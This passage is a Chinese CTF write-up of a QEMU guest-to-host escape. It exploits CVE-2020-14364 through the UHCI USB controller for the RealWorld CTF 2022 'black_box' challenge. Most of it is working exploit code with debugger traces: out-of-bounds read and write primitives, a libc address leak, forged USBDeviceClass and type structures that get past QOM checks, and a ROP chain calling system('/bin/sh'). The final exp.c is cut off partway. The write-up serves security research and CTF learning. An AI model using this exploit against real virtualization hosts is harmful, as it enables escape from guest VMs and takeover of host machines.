NULL */    const USBDescDevice *device;    int configuration;    int ninterfaces;    int altsetting[USB_MAX_INTERFACES];    const USBDescConfig *config;    const USBDescIface  *ifaces[USB_MAX_INTERFACES];&#125;;\n位于data_buf后方的变量有setup_len和setup_index，那么我们越界覆盖这两个变量，便可以构造任意地址写，首先进行初始化\nvoid init_state() &#123;    //初始化时，使用正常的长度    setup_buf[6] = 0xff;    setup_buf[7] = 0x0;    td-&gt;link = get_phys_addr(td);    td-&gt;ctrl = TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;    td-&gt;buffer = get_phys_addr(setup_buf);    puts(&quot;set_UHCIState&quot;);    set_UHCIState();&#125;\n初始化的目的是当进入do_token_setup函数时\nstatic void do_token_setup(USBDevice *s, USBPacket *p)&#123;    int request, value, index;    if (p-&gt;iov.size != 8) &#123;        p-&gt;status = USB_RET_STALL;        return;    &#125;    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);    s-&gt;setup_index = 0;    p-&gt;actual_length = 0;    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;        fprintf(stderr,                &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\\n&quot;,                s-&gt;setup_len, sizeof(s-&gt;data_buf));        p-&gt;status = USB_RET_STALL;        return;    &#125;..............................        if (s-&gt;setup_len == 0)            s-&gt;setup_state = SETUP_STATE_ACK;        else            s-&gt;setup_state = SETUP_STATE_DATA;    &#125;    p-&gt;actual_length = 8;&#125;\n能够执行到代码s-&gt;setup_state = SETUP_STATE_DATA;，为s-&gt;setup_state赋值，因为这个s-&gt;setup_state将会在do_token_in和do_token_out中作为switch的条件，s-&gt;setup_state必须为SETUP_STATE_DATA才可以进行数据的读写。\nstatic void do_token_in(USBDevice *s, USBPacket *p)&#123;..............................    switch(s-&gt;setup_state) &#123;    case SETUP_STATE_ACK:................................        break;    case SETUP_STATE_DATA:................................. //vuln    &#125;&#125;\n初始化完成以后，就可以利用漏洞将s-&gt;setup_len设置为任意值进行后续的越界。下面，我们写出set_length，do_copy_read和do_copy_write三个函数。\nvoid set_length(uint16_t len, uint8_t option)&#123;    setup_buf[0] = USB_TOKEN_IN | option;    //set the length    setup_buf[6] = len &amp; 0xff;    setup_buf[7] = (len &gt;&gt; 8 ) &amp; 0xff;    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;    td-&gt;buffer = get_phys_addr(setup_buf);    set_UHCIState();&#125;//do_token_in读取数据void do_copy_read(uint16_t len)&#123;    //设置token进入do_token_in    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token =  USB_TOKEN_IN | (len-1) &lt;&lt; 21; //设置p-&gt;iov.size    td-&gt;buffer = get_phys_addr(data_buf);    set_UHCIState();&#125;//do_token_out写入数据void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index, uint16_t len)&#123;    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;    td-&gt;token =  USB_TOKEN_OUT | (len-1) &lt;&lt; 21;     td-&gt;buffer = get_phys_addr(data_buf);    set_UHCIState();&#125;\n现在来完成我们的任意地址写，首先需要设置length，然后多次调用do_copy_write\nstatic void do_token_out(USBDevice *s, USBPacket *p)&#123;........................    case SETUP_STATE_DATA:        if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;            int len = s-&gt;setup_len - s-&gt;setup_index;            if (len &gt; p-&gt;iov.size) &#123;                len = p-&gt;iov.size;            &#125;            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);            s-&gt;setup_index += len;            if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;                s-&gt;setup_state = SETUP_STATE_ACK;            &#125;........................&#125;\n如上是do_token_out的代码，由于s-&gt;setup_len被我们设置为任意大小，因此if (s-&gt;setup_index &gt;= s-&gt;setup_len)条件可以被我们控制，这样s-&gt;setup_state就不会被设置为SETUP_STATE_ACK，那么我们就可以一直进行do_token_out写数据，每次写，s-&gt;setup_index += len，即s-&gt;setup_index经过多次写后，可以累加到超过s-&gt;data_buf的长度，那么当进行usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len)时，就发生了越界写。从USBDevice的结构体来看\nstruct USBDevice &#123;.......................    uint8_t setup_buf[8];    uint8_t data_buf[4096];    int32_t remote_wakeup;    int32_t setup_state;    int32_t setup_len;    int32_t setup_index;.......................\n我们可以向后越界写，覆盖setup_len和setup_index，那么我们可以实现任意地址写，设置setup_index为任意地址到data_buf地址的偏移，设置setup_len为要写的数据长度。从上分析，为了实现任意地址写，首先需要知道data_buf的地址。与上同理，可以通过多次do_token_in函数调用，让setup_index越界后，泄露出data_buf后方的数据。\nstruct USBDevice &#123;.............    int32_t state;    uint8_t setup_buf[8];    uint8_t data_buf[4096];    int32_t remote_wakeup;    int32_t setup_state;    int32_t setup_len;    int32_t setup_index;    USBEndpoint ep_ctl;.............\n注意到data_buf后方有一个USBEndpoint结构体，改结构体定义如下\nstruct USBEndpoint &#123;    uint8_t nr;    uint8_t pid;    uint8_t type;    uint8_t ifnum;    int max_packet_size;    int max_streams;    bool pipeline;    bool halted;    USBDevice *dev;    QTAILQ_HEAD(, USBPacket) queue;&#125;;\n里面有一个USBDevice *dev;指向当前USBDevice自身，那么我们泄露出USBDevice的地址，再加上data_buf在USBDevice中的偏移，即可知道data_buf的地址。泄露的代码如下\nint main() &#123;   init();   //申请IO权限   iopl(3);   init_state();   set_length(0x5000,USB_DIR_IN);   for(int i = 0; i &lt; 4; i++)        do_copy_read(0x400);  //set index 0x1000   do_copy_read(0x400);      //read 0x400 to dmabuf   struct USBDevice* usb_device_tmp = (struct USBDevice *)(data_buf + 0x4);   struct USBDevice usb_device;   memcpy(&amp;usb_device,usb_device_tmp,sizeof(USBDevice));   uint64_t dev_addr = (uint64_t)(usb_device.ep_ctl.dev);   data_buf_addr = dev_addr + 0xdc - 0x8;   //data_buf_addr = dev_addr + 0xdc;   printf(&quot;USBDevice dev_addr: 0x%lx\\n&quot;, dev_addr);   printf(&quot;USBDevice-&gt;data_buf: 0x%lx\\n&quot;, data_buf_addr);&#125;\n有了data_buf的地址，接下来我们构造任意地址写\n//任意写void arb_write_seq(uint64_t target_addr, uint64_t *payload,uint64_t len)&#123;    //初始化setup_state    set_length(0x500, USB_DIR_OUT);    unsigned long offset = target_addr - data_buf_addr;    //设置越界长度    set_length(0x1010, USB_DIR_OUT);    puts(&quot;set index&quot;);    getchar();    //将setup_index设置为0x1000    do_copy_write(0, 0, 0, 0x400);    do_copy_write(0, 0, 0, 0x400);    do_copy_write(0, 0, 0, 0x400);    do_copy_write(0, 0, 0, 0x400);    //覆盖setup_state、setup_len、setup_index    do_copy_write(0, offset+len, offset-0x10, 0x11);    memcpy(data_buf,payload,len);    puts(&quot;wait&quot;);    getchar();    do_copy_write(0, 0xffff, 0,len);&#125;int main() &#123;   init();   //申请IO权限   iopl(3);   init_state();   set_length(0x5000,USB_DIR_IN);   for(int i = 0; i &lt; 4; i++)        do_copy_read(0x400);  //set index 0x1000   do_copy_read(0x400);      //read 0x400 to dmabuf   struct USBDevice* usb_device_tmp = (struct USBDevice *)(data_buf + 0x4);   struct USBDevice usb_device;   memcpy(&amp;usb_device,usb_device_tmp,sizeof(USBDevice));   uint64_t dev_addr = (uint64_t)(usb_device.ep_ctl.dev);   data_buf_addr = dev_addr + 0xdc - 0x8;   //data_buf_addr = dev_addr + 0xdc;   printf(&quot;USBDevice dev_addr: 0x%lx\\n&quot;, dev_addr);   printf(&quot;USBDevice-&gt;data_buf: 0x%lx\\n&quot;, data_buf_addr);   uint64_t payload[0x100];   payload[0] = 0x6161616161616161;   arb_write_seq(0x4141414141414141,payload,0x8);&#125;\n调试如下,经过前4次的do_copy_write(0, 0, 0, 0x400)\nIn file: /home/sea/Desktop/qemu/hw/usb/core.c   241             if (len &gt; p-&gt;iov.size) &#123;   242                 len = p-&gt;iov.size;   243             &#125;   244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);   245             s-&gt;setup_index += len; ► 246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;   247                 s-&gt;setup_state = SETUP_STATE_ACK;   248             &#125;   249             return;   250         &#125;   251         s-&gt;setup_state = SETUP_STATE_IDLE;──────────────────────────────────────────────────────────────────────────────────────────[ pwndbg&gt; p/x s-&gt;setup_index$167 = 0x1000pwndbg&gt; p/x s-&gt;setup_len$168 = 0x1010\n那么接下来的do_copy_write(0, offset+len, offset-0x10, 0x11);如下\nIn file: /home/sea/Desktop/qemu/hw/usb/core.c   239         if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;   240             int len = s-&gt;setup_len - s-&gt;setup_index;   241             if (len &gt; p-&gt;iov.size) &#123;   242                 len = p-&gt;iov.size;   243             &#125; ► 244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);   245             s-&gt;setup_index += len;   246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;   247                 s-&gt;setup_state = SETUP_STATE_ACK;   248             &#125;   249             return;pwndbg&gt; p/x s-&gt;setup_index$169 = 0x1000pwndbg&gt; p/x len$170 = 0x10\n经过copy以后\nIn file: /home/sea/Desktop/qemu/hw/usb/core.c   241             if (len &gt; p-&gt;iov.size) &#123;   242                 len = p-&gt;iov.size;   243             &#125;   244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);   245             s-&gt;setup_index += len; ► 246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;   247                 s-&gt;setup_state = SETUP_STATE_ACK;   248             &#125;   249             return;   250         &#125;   251         s-&gt;setup_state = SETUP_STATE_IDLE;pwndbg&gt; p/x s-&gt;setup_index$172 = 0xaf362b0d\n那么当do_copy_write(0, 0xffff, 0,len)时\nIn file: /home/sea/Desktop/qemu/hw/usb/core.c   239         if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;   240             int len = s-&gt;setup_len - s-&gt;setup_index;   241             if (len &gt; p-&gt;iov.size) &#123;   242                 len = p-&gt;iov.size;   243             &#125; ► 244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);   245             s-&gt;setup_index += len;   246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;   247                 s-&gt;setup_state = SETUP_STATE_ACK;   248             &#125;   249             return;pwndbg&gt; p/x s-&gt;data_buf + s-&gt;setup_index$173 = 0x55c941414141\n可以发现，已经可以控制s-&gt;data_buf + s-&gt;setup_index为任意地址，当这有个限制是，s-&gt;setup_index是一个int型数据，因此只能在离s-&gt;data_buf距离int范围内进行任意写。\n0x05 黑盒虚拟机逃逸分析在RealWord 2022国际赛上，我们拿到了black_box的二血，这题没有给题目附件，仅有一个远程nc环境，且提示本题是CVE-2020-14364。首先通过lscpi\n/ # lspci -k00:01.2 Class 0c03: 8086:7020 uhci_hcd00:01.0 Class 0601: 8086:700000:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 0200: 8086:100e00:01.1 Class 0101: 8086:7010 ata_piix00:02.0 Class 0300: 1234:1111\n发现远程使用的是uhci的USB控制器，之前在网上的相关exp使用的是ehci控制器，通过mmio去进行设备的交互。而本题的难点一个就是它使用UHCI控制器，该设备我们前面已经介绍了。前面我们已经实现了任意地址写，那么想要劫持程序流程，还需要知道一些地址。\n在黑盒下，我们不考虑使用程序本身的函数地址，因为我们没有附件，我们可以考虑使用glibc的地址。\n首先是因为USBDevice这个结构体本身就是在堆中，通过malloc申请的，那么我们利用其越界读，将堆中所有的数据全部打印出来，由于程序的复杂性，堆里必定会有unsorted bin，那么其fd和bk泄漏后，我们就可以知道其使用的glibc版本。这是因为大多数情况下，glibc每一个版本其相关的函数、变量、符号地址会不一样，并且由于PIE的特性，函数、变量、符号的地址后12bit是不变的。泄露堆中的地址以后，我们查看其数据，经过多年的CTF经验，确定了远程glibc版本为2.32或者2.33，这两个版本的unsorted bin的fd和bk一样，后12bit都是0xc00，那么我们可以最后把这两个版本中的gadgets都尝试一遍。\n地址泄露泄露地址的方法如下\nuint64_t *tmp = (uint64_t *)(data_buf + 0x4);uint64_t libc_base = -1;uint64_t main_arena_xx_addr;//搜索main_arena指针for (int j=0;j&lt;100;j++) &#123;   for (int i=0;i&lt;0x400/0x8;i++) &#123;      main_arena_xx_addr = tmp[i];      if ((main_arena_xx_addr &gt;&gt; 40) == 0x7f &amp;&amp; ((main_arena_xx_addr &amp; 0xfff) == 0xc00)) &#123;         //printf(&quot;heap size=0x%lx fd=0x%lx\\n&quot;,tmp[i-1],main_arena_xx_addr);         libc_base = main_arena_xx_addr - 0x1e0c00;         goto outer;      &#125;   &#125;   //write(1,data_buf,0x400);   do_copy_read(0x400);&#125;outer:if(libc_base == -1)&#123;    printf(&quot;Error,DO IT AGAIN\\n&quot;);    return 0;&#125;uint64_t system_addr = libc_base + 0x4fa60;printf(&quot;leak libc_base address : 0x%lx!\\n&quot;, libc_base);printf(&quot;leak system_addr address: 0x%lx!\\n&quot;, system_addr);\n劫持USBDeviceClass对象虽然构造了任意地址写，但是却无法构造出任意地址读，主要是因为UHCI一次最多允许传输0x7ff大小读数据\nstruct USBDevice &#123;..................    uint8_t setup_buf[8];    uint8_t data_buf[4096];    int32_t remote_wakeup;    int32_t setup_state;    int32_t setup_len;    int32_t setup_index;.................\n而想要实现任意地址读，我们需要同时控制setup_buf和后面的setup_state、setup_len、setup_index，他们，由于setup_buf与后面三个多跨度超过了0x7ff，因此无法一次性进行控制，无法将当前的写数据模式转变为读数据模式。\n由于已经有了glibc的一些地址，已经足够我们使用。稳定的劫持程序流程的方法是伪造USBDevice结构体中的第一个成员，即USBDeviceClass *，因为通过泄露远程环境中的内存数据，发现远程内存中数据复杂，不适合进行劫持。这个方法是如何找到的？首先我们利用gdb调试任意一个qemu-system-x86_64,并在do_token_in下断点，然后执行测试程序，让qemu运行到断点的地方，此时将USBDevice结构体中的第一个成员修改为0。\nIn file: /home/sea/Desktop/qemu/hw/usb/core.c   208             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);   209             s-&gt;setup_index += len;   210             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;   211                 s-&gt;setup_state = SETUP_STATE_ACK;   212             &#125; ► 213             return;   214         &#125;   215         s-&gt;setup_state = SETUP_STATE_IDLE;   216         p-&gt;status = USB_RET_STALL;   217         break;   218 pwndbg&gt; p s$174 = (USBDevice *) 0x55dcfe269560pwndbg&gt; tel 0x55dcfe26956000:0000│   0x55dcfe269560 —▸ 0x55dcfd108800 —▸ 0x55dcfd0bc950 —▸ 0x55dcfd0bcad0 ◂— &#x27;usb-storage&#x27;01:0008│   0x55dcfe269568 —▸ 0x7f20cb21e770 (g_free) ◂— endbr64 02:0010│   0x55dcfe269570 —▸ 0x55dcfe233580 ◂— 0x20 /* &#x27; &#x27; */03:0018│   0x55dcfe269578 ◂— 0x204:0020│   0x55dcfe269580 —▸ 0x55dcfd1379e0 —▸ 0x55dcfd0ea070 —▸ 0x55dcfd0c2ad0 —▸ 0x55dcfd0c2c50 ◂— ...05:0028│   0x55dcfe269588 ◂— 0x006:0030│   0x55dcfe269590 ◂— 0x107:0038│   0x55dcfe269598 —▸ 0x55dcfd0c8ad0 ◂— 0x0pwndbg&gt; eq 0x55dcfe269560 0\n然后继续运行，qemu必定会崩溃，gdb会捕捉到崩溃发生的地方\npwndbg&gt; cContinuing.Thread 1 &quot;qemu-system-x86&quot; received signal SIGSEGV, Segmentation fault.0x000055dcfbc82fe8 in usb_device_ep_stopped (dev=0x55dcfe269560, ep=0x55dcfe26a648) at hw/usb/bus.c:223.........................──────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────In file: /home/sea/Desktop/qemu/hw/usb/bus.c   218 &#125;   219    220 void usb_device_ep_stopped(USBDevice *dev, USBEndpoint *ep)   221 &#123;   222     USBDeviceClass *klass = USB_DEVICE_GET_CLASS(dev); ► 223     if (klass-&gt;ep_stopped) &#123;   224         klass-&gt;ep_stopped(dev, ep);   225     &#125;   226 &#125;\n从这就可以知道，当do_token_in或者do_token_out操作完成以后，最先要用到USBDeviceClass *指针的地方是这里，并且可以看到后面还有一个函数指针调用。那么伪造一个USBDeviceClass *是绝佳的选择。该结构体中，我们需要伪造的数据主要有以下\ntypedef struct USBDeviceClass &#123;    DeviceClass parent_class;.....................    /*     * Called by the hcd to let the device know the queue for an endpoint     * has been unlinked / stopped. Optional may be NULL.     */    void (*ep_stopped)(USBDevice *dev, USBEndpoint *ep);.....................&#125; USBDeviceClass;\n将ep_stopped指向gadgets，进而可以做栈迁移。首先，我们将USBDeviceClass *修改为一个任意的可读写的堆地址\nuint64_t payload[0x400/0x8];payload[0x0] = dev_addr + 0x10;arb_write_seq(dev_addr,payload,0x400);\n然后在运行qemu，并执行程序，用gdb调试捕捉崩溃\nIn file: /home/sea/Desktop/qemu/hw/usb/core.c   546 void usb_packet_set_state(USBPacket *p, USBPacketState state)   547 &#123;   548     if (p-&gt;ep) &#123;   549         USBDevice *dev = p-&gt;ep-&gt;dev;   550         USBBus *bus = usb_bus_from_device(dev); ► 551         trace_usb_packet_state_change(bus-&gt;busnr, dev-&gt;port-&gt;path, p-&gt;ep-&gt;nr, p,   552                                       usb_packet_state_name(p-&gt;state),   553                                       usb_packet_state_name(state));   554     &#125; else &#123;....................pwndbg&gt; p bus$9 = (USBBus *) 0x0pwndbg&gt; p *dev$8 = &#123;  qdev = &#123;    parent_obj = &#123;      class = 0x5584542726c8,      free = 0x0,      properties = 0x0,      ref = 0,      parent = 0x0    &#125;,    id = 0x0,    realized = false,    pending_deleted_event = false,    opts = 0x0,    hotplugged = 0,    parent_bus = 0x0,.................\n其中usb_bus_from_device代码如下\nstatic inline USBBus *usb_bus_from_device(USBDevice *d)&#123;    return DO_UPCAST(USBBus, qbus, d-&gt;qdev.parent_bus);&#125;\n崩溃原因是dev-&gt;qdev-&gt;parent_bus指针被我们覆盖了，同时dev-&gt;port也被我们覆盖了，因此也需要重新伪造上去\nuint64_t payload[0x400/0x8];payload[0x0] = dev_addr + 0x10;//fake a USBDeviceClass at dev_addr + 0x10payload[0x9] = dev_addr + 0x8; //buspayload[0xe] = dev_addr + 0x8; //portarb_write_seq(dev_addr,payload,0x400);\n这次运行，崩溃在这里\nIn file: /home/sea/Desktop/qemu/qom/object.c   700                                               const char *file, int line,   701                                               const char *func)   702 &#123;   703     ObjectClass *ret;   704  ► 705     trace_object_class_dynamic_cast_assert(class ? class-&gt;type-&gt;name : &quot;(null)&quot;,   706                                            typename, file, line, func);   707    708 #ifdef CONFIG_QOM_CAST_DEBUG   709     int i;   710 pwndbg&gt; p class$20 = (ObjectClass *) 0x55bb52c756d0pwndbg&gt; p class-&gt;type$21 = (Type) 0x0\nclass-&gt;type也应该伪造为一个可读的地址\nuint64_t payload[0x400/0x8];payload[0x0] = dev_addr + 0x10; //fake a USBDeviceClass at dev_addr + 0x10payload[0x2] = dev_addr + 0x8; //typepayload[0x9] = dev_addr + 0x8; //buspayload[0xe] = dev_addr + 0x8; //portarb_write_seq(dev_addr,payload,0x400);\n这一次，程序没有崩溃，而是抛出了异常\nhw/usb/bus.c:222:usb_device_ep_stopped: Object 0x55d6988446d0 is not an instance of type usb-devicepwndbg&gt; k#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:49#1  0x00007f5c775cf864 in __GI_abort () at abort.c:79#2  0x000055d6961aeffb in object_class_dynamic_cast_assert (class=0x55d6988446d0, typename=0x55d69639e358 &quot;usb-device&quot;, file=0x55d69639e2cf &quot;hw/usb/bus.c&quot;, line=222, func=0x55d69639e890 &lt;__func__.23&gt; &quot;usb_device_ep_stopped&quot;) at qom/object.c:727#3  0x000055d6960f1480 in usb_device_ep_stopped (dev=0x55d6988446c0, ep=0x55d6988457a8) at hw/usb/bus.c:222.....................pwndbg&gt;\n并且从中可以看到，usb_device_ep_stopped是已经执行到了，发生异常是因为object_class_dynamic_cast_assert校验我们伪造的USBDeviceClass *没有通过。同时，我们也得到一个很重要的信息hw/usb/bus.c:222，在远程机器上，我们知道这个异常发生在bus.c文件的222行，那么意味着我们已经可以将远程qemu的版本缩小到一个范围。其中object_class_dynamic_cast_assert源码如下\nObjectClass *object_class_dynamic_cast_assert(ObjectClass *class,                                              const char *typename,                                              const char *file, int line,                                              const char *func)&#123;    ObjectClass *ret;    trace_object_class_dynamic_cast_assert(class ? class-&gt;type-&gt;name : &quot;(null)&quot;,                                           typename, file, line, func);#ifdef CONFIG_QOM_CAST_DEBUG    int i;    for (i = 0; class &amp;&amp; i &lt; OBJECT_CLASS_CAST_CACHE; i++) &#123;        if (atomic_read(&amp;class-&gt;class_cast_cache[i]) == typename) &#123;            ret = class;            goto out;        &#125;    &#125;#else    if (!class || !class-&gt;interfaces) &#123;        return class;    &#125;#endif    ret = object_class_dynamic_cast(class, typename);    if (!ret &amp;&amp; class) &#123;        fprintf(stderr, &quot;%s:%d:%s: Object %p is not an instance of type %s\\n&quot;,                file, line, func, class, typename);        abort();    &#125;...................\n可以看到如果在class-&gt;class_cast_cache[i]中存在typename指针，则可以通过娇艳，经过调试，发现typename是qemu-systen-x86_64中的地址，显然我们不能用，因为我们没有远程的附件。于是继续向下看object_class_dynamic_cast函数\nObjectClass *object_class_dynamic_cast(ObjectClass *class,                                       const char *typename)&#123;    ObjectClass *ret = NULL;    TypeImpl *target_type;    TypeImpl *type;    if (!class) &#123;        return NULL;    &#125;    /* A simple fast path that can trigger a lot for leaf classes.  */    type = class-&gt;type;    if (type-&gt;name == typename) &#123;        return class;    &#125;    target_type = type_get_by_name(typename);    if (!target_type) &#123;        /* target class type unknown, so fail the cast */        return NULL;    &#125;    if (type-&gt;class-&gt;interfaces &amp;&amp;            type_is_ancestor(target_type, type_interface)) &#123;        int found = 0;        GSList *i;        for (i = class-&gt;interfaces; i; i = i-&gt;next) &#123;            ObjectClass *target_class = i-&gt;data;            if (type_is_ancestor(target_class-&gt;type, target_type)) &#123;                ret = target_class;                found++;            &#125;         &#125;        /* The match was ambiguous, don&#x27;t allow a cast */        if (found &gt; 1) &#123;            ret = NULL;        &#125;    &#125; else if (type_is_ancestor(type, target_type)) &#123;        ret = class;    &#125;    return ret;&#125;\n这里，我们伪造type-&gt;class-&gt;interfaces为0，于是进入分支else if (type_is_ancestor(type, target_type))，只要type_is_ancestor为真就可以通过校验其中type_is_ancestor代码如下\nstatic bool type_is_ancestor(TypeImpl *type, TypeImpl *target_type)&#123;    assert(target_type);    /* Check if target_type is a direct ancestor of type */    while (type) &#123;        if (type == target_type) &#123;            return true;        &#125;        type = type_get_parent(type);    &#125;    return false;&#125;static TypeImpl *type_get_parent(TypeImpl *type)&#123;    if (!type-&gt;parent_type &amp;&amp; type-&gt;parent) &#123;        type-&gt;parent_type = type_get_by_name(type-&gt;parent);        g_assert(type-&gt;parent_type != NULL);    &#125;    return type-&gt;parent_type;&#125;static TypeImpl *type_get_parent(TypeImpl *type)&#123;    if (!type-&gt;parent_type &amp;&amp; type-&gt;parent) &#123;        type-&gt;parent_type = type_get_by_name(type-&gt;parent);        g_assert(type-&gt;parent_type != NULL);    &#125;    return type-&gt;parent_type;&#125;static TypeImpl *type_get_by_name(const char *name)&#123;    if (name == NULL) &#123;        return NULL;    &#125;    return type_table_lookup(name);&#125;\n通过分析，我们只需要伪造一个type-&gt;parent字符串为对象的名字，比如usb-device，同时伪造type-&gt;parent_type为0，这样，就可以调用type_get_by_name从全局对象hash表中查找对应的Type返回。于是，我们的伪造如下\nuint64_t payload[0x400/0x8];int type_base = 0x25;payload[0x0] = dev_addr + 0x10;//fake a USBDeviceClass at dev_addr + 0x10payload[0x2] = dev_addr + type_base*0x8; //typepayload[0x9] = dev_addr + 0x8; //buspayload[0xe] = dev_addr + 0x8; //port//fake a typepayload[type_base] = 0; //namepayload[type_base+0xb] = dev_addr + (type_base + 0xe) * 8;payload[type_base+0xc] = 0; //type-&gt;parent_typepayload[type_base+0xd] = dev_addr + 0x8; //type-&gt;classchar *p = &quot;usb-device&quot;;memcpy(&amp;payload[type_base + 0xe],p,strlen(p)+1);arb_write_seq(dev_addr,payload,0x400);\n在usb_device_ep_stopped下断点进行调试，这次成功通过了校验\nIn file: /home/sea/Desktop/qemu/hw/usb/bus.c   218 &#125;   219    220 void usb_device_ep_stopped(USBDevice *dev, USBEndpoint *ep)   221 &#123;   222     USBDeviceClass *klass = USB_DEVICE_GET_CLASS(dev); ► 223     if (klass-&gt;ep_stopped) &#123;   224         klass-&gt;ep_stopped(dev, ep);   225     &#125;   226 &#125;pwndbg&gt; p klass$23 = (USBDeviceClass *) 0x555955f036d0\nklass指向了我们伪造的class，为了进一步缩小远程的qemu版本范围，我们将type-&gt;parent字符串修改为一个任意值，如下\nuint64_t payload[0x400/0x8];int type_base = 0x25;payload[0x0] = dev_addr + 0x10;//fake a USBDeviceClass at dev_addr + 0x10payload[0x2] = dev_addr + type_base*0x8; //typepayload[0x9] = dev_addr + 0x8; //buspayload[0xe] = dev_addr + 0x8; //port//fake a typepayload[type_base] = 0; //namepayload[type_base+0xb] = dev_addr + (type_base + 0xe) * 8;payload[type_base+0xc] = 0; //type-&gt;parent_typepayload[type_base+0xd] = dev_addr + 0x8; //type-&gt;classchar *p = &quot;aaaaaa&quot;;memcpy(&amp;payload[type_base + 0xe],p,strlen(p)+1);arb_write_seq(dev_addr,payload,0x400);\n上传到远程环境执行，会有异常提示\n/ # ./exp.....................**ERROR:qom/object.c:167:type_get_parent: assertion failed: (type-&gt;parent_type != NULL)Bail out! ERROR:qom/object.c:167:type_get_parent: assertion failed: (type-&gt;parent_type != NULL)Aborted (core dumped)\n在qom/object.c的第167行断言失败，结合两处的报错行数，我们确定出了qemu的版本是stable-2.10，那么将该版本的代码下载过来编译，就能尽可能的接近远程的环境。通过调试，确定了klass-&gt;ep_stopped函数指针的偏移，因此我们在对应的位置上伪造好gadgets\n//ep_stoppedpayload[0x24] = mov_rdx_qp_rdi;int rop_start = 0x40;//ROPpayload[0x1] = dev_addr + rop_start*8 ;//rdxpayload[rop_start+0x4] = set_context;payload[rop_start+0xa0/0x8] = dev_addr + (rop_start*8+0xb0); //new stackpayload[rop_start+0xa8/0x8] = pop_rdi_rbp;payload[rop_start+0xb0/0x8] = dev_addr + (rop_start*8+0xc8);payload[rop_start+0xc0/0x8] = system_addr;char *cmd = &quot;/bin/sh&quot;;memcpy(&amp;payload[rop_start+0xc8/0x8],cmd,strlen(cmd)+1);\nEXP最终的exp.c如下\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;#define LOCAL#ifdef LOCAL#define ARENA_OFFSET 0x1e3c00#define SYSTEM_OFFSET 0x503c0#define GADGET_OFFSET 0x14b760#define SETCONTEXT_OFFSET 0x5306d#define POP_RDI_RBP_OFFSET 0x29522#else#define ARENA_OFFSET 0x1e0c00#define SYSTEM_OFFSET 0x4fa60#define GADGET_OFFSET 0x14a0a0#define SETCONTEXT_OFFSET 0x529AD#define POP_RDI_RBP_OFFSET 0x28db2#endif#define PFN_MASK ((((size_t)1)&lt;&lt;54)-1)#define UHCI_BASE 0xc040#define UHCI_CMD_HCRESET (1 &lt;&lt; 1)#define UHCI_CMD_RS (1 &lt;&lt; 0)#define UHCI_PORT_RESET (1 &lt;&lt; 9)#define UHCI_PORT_EN    (1 &lt;&lt; 2)    //enable#define UHCI_PORT_CCS   (1 &lt;&lt; 0)#define TD_CTRL_ACTIVE  (1 &lt;&lt; 23)#define TD_CTRL_SPD     (1 &lt;&lt; 29)  //we need this to allow we send more than two#define USB_TOKEN_SETUP     0x2d#define USB_TOKEN_IN        0x69 /* device -&gt; host */#define USB_TOKEN_OUT       0xe1 /* host -&gt; device */#define USB_DIR_OUT         0#define USB_DIR_IN          0x80typedef struct UHCI_TD &#123;    uint32_t link;    uint32_t ctrl; /* see TD_CTRL_xxx */    uint32_t token;    uint32_t buffer;&#125; UHCI_TD;typedef struct USBEndpoint USBEndpoint;typedef struct USBDevice USBDevice;struct USBEndpoint &#123;    uint8_t nr;    uint8_t pid;    uint8_t type;    uint8_t ifnum;    int max_packet_size;    int max_streams;    bool pipeline;    bool halted;    USBDevice *dev;    USBEndpoint *fd;    USBEndpoint *bk;&#125;;struct USBDevice &#123;    int32_t remote_wakeup;    int32_t setup_state;    int32_t setup_len;    int32_t setup_index;    USBEndpoint ep_ctl;    USBEndpoint ep_in[15];    USBEndpoint ep_out[15];&#125;;struct UHCI_TD * td;uint32_t *td_phy_addr_in_any_frame;char *dmabuf;unsigned char *data_buf;uint64_t data_buf_addr;char *setup_buf;void die(char *msg) &#123;   perror(msg);   exit(-1);&#125;/*向设备写入数据*/void pmio_write(uint32_t addr,uint32_t val) &#123;   outl(val,UHCI_BASE + addr);&#125;/*从UHCI读取数据*/uint32_t pmio_read(uint32_t addr) &#123;   return (uint32_t)inl(UHCI_BASE + addr);&#125;//虚拟地址转换为物理地址size_t get_phys_addr(void *vir_addr) &#123;   int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); /*打开页映射表*/   if (fd == -1) &#123;      die(&quot;open pagemap error&quot;);   &#125;   size_t vir = 